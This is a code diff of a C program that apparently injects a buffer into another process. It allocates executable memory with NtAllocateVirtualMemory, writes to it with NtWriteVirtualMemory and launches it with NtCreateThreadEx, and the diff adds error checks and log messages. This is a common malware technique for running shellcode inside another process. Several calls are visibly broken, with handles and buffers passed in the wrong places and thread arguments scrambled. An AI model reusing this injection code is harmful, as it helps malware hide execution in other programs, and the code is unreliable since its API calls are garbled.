@@ -106,20 +106,34 @@ int main(int argc, char* argv[]) {
         w("failed to get handle on process. 0x%x", status);
         goto CLEANUP;
     }
+
+    k(" process gotten!");
     status = NtAllocateVirtualMemory(&hProc, &Buf, s,0x00001000,0x40 );
 
     // h, IntPtr.Zero, 0,Buf.Length, 0x00001000, 0x40
 
 
 i(" allocating... ");
+
+    if(status != STATUS_SUCCESS) {
+        w("failed to allocate virtual memory. 0x%x", status);
+        goto CLEANUP;
+    }
+    k("allocated memory!");
   status = NtWriteVirtualMemory(&hProc,&hProc,&Buf,s,NULL);
 
     //h, memAlloc , 0, Buf, (uint)(Buf.Length), out outout
     i("writing v mem");
+
+    if(status != STATUS_SUCCESS) {
+        w("failed to write virtual memory. 0x%x", status);
+        goto CLEANUP;
+    }
+    k("wrote memory!");
+
 hThread = NtCreateThreadEx(s,&Buf, NULL,(PTHREAD_START_ROUTINE)hProc, NULL, 0, 0,0,0,NULL);
 
 
-    status = NtClose(y);
 
     return EXIT_SUCCESS;
 
